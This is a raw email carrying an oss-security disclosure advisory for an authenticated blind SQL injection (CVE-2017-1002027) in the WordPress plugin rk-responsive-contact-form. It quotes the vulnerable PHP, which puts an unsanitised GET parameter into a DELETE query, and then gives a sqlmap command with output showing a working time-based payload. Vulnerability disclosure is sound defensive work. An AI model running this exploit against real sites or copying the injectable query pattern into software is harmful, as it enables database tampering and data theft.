X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2346" "Wednesday" "23" "August" "2017" "08:22:07" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<CEF95F5A-B021-4514-867B-64B38D7CFBF3@me.com>" "60" "[oss-security] Authenticated Blind SQL Injection vulnerability in Wordpress plugin rk-responsive-contact-form v1.0" nil nil nil "8" "2017082312:22:07" "[oss-security] Authenticated Blind SQL Injection vulnerability in Wordpress plugin rk-responsive-contact-form v1.0" (number mark "U       larry0@me.co Aug 23   60/2346  " thread-indent "\"[oss-security] Authenticated Blind SQL Injection vulnerability in Wordpress plugin rk-responsive-contact-form v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11474 invoked by uid 550); 23 Aug 2017 12:22:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11456 invoked from network); 23 Aug 2017 12:22:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1503490930; bh=KxIZCAKtIL7J070Cjw1vB6/JbeUNfFhdqUO3HJ2zBck=;
	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
	b=fA/5gIvoRaWeF3/nq+3HTmBgnnzEqUS+vnK3BeSTwxDmLIeC92WvjPx0uQeZ/4zKD
 e2T4l51w+e5wYv2oP+EbM7C+xTCtxaXcxpCX3l5Ci53oE7XxCbkxo2vWXpKsyORajr
 9e74R8jWqr4ynxfOYTEEXt6FpzjeP2R5fe7fIuEUfQuiEStQ6/jSNAh3B1j+1KxcaB
 PtdSc1HgIYIV5GyBbr5QEpzZeKxTWzArA+EvLuFB21cvIUeNrMnMcuq7zlA8up/lCs
 KJVXi5dxLK8xa/q3zUfj9uKCQxq0JheFbvpfWXKN8DdC81EWK14PTRqKTVyAqhv4Ki
 nNayv8UYEdOUQ==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-08-23_05:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1708230186
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-id: <CEF95F5A-B021-4514-867B-64B38D7CFBF3@me.com>
Date: Wed, 23 Aug 2017 08:22:07 -0400
To: Open Source Security <oss-security@lists.openwall.com>
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] Authenticated Blind SQL Injection vulnerability in Wordpress plugin
 rk-responsive-contact-form v1.0

Title: Authenticated Blind SQL Injection vulnerability in Wordpress plugin =
rk-responsive-contact-form v1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2017-07-01
CVE-ID:[CVE-2017-1002027]
Download Site: https://wordpress.org/plugins/rk-responsive-contact-form/
Vendor: rkdevelopers
Vendor Notified: 2017-08-05
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D198
Description: A simple WordPress plugin that generates a responsive contact =
form on your website or blog
Vulnerability:
The variable $delid isn't sanitized before being passed into an SQL query i=
n file ./rk-responsive-contact-form/include/rk_user_list.php :

1-<?php=20
2-	global $wpdb;
3-	$table_name =3D $wpdb->prefix . "rk_contact";
4:	$info=3D$_GET["info"];
5-	if($info=3D=3D"del")
6-	{
7:	$delid=3D$_GET["did"];
8-=09
9-	$wpdb->query("delete from ".$table_name." where `user_id`=3D".$delid);
10-	echo "<div style=3D'clear:both;'></div><div class=3D'updated' id=3D'mes=
sage'><p><strong>:".__('User Record Deleted.','rkcontactform')."</strong>.<=
/p></div>";
11-	}
12-?>

The attacker must have permission to modify contacts in order to exploit th=
is vulnerability.

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wp-admin/admin.php?page=3Drk_use=
r_lists&info=3Ddel&did=3D*' --load-cookies=3D./cookie.txt --level=3D2 --ris=
k=3D1 --dbms=3Dmysql=20
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 318 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2   Type: AND/OR time-based blind
	=E2=80=A2   Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2   Payload: http://example.com:80/wp-admin/admin.php?page=3Drk_us=
er_lists&info=3Ddel&did=3D(CASE WHEN (6363=3D6363) THEN SLEEP(5) ELSE 6363 =
END)
	=E2=80=A2 ---
	=E2=80=A2 [10:57:22] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [10:57:22] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 10:57:22=
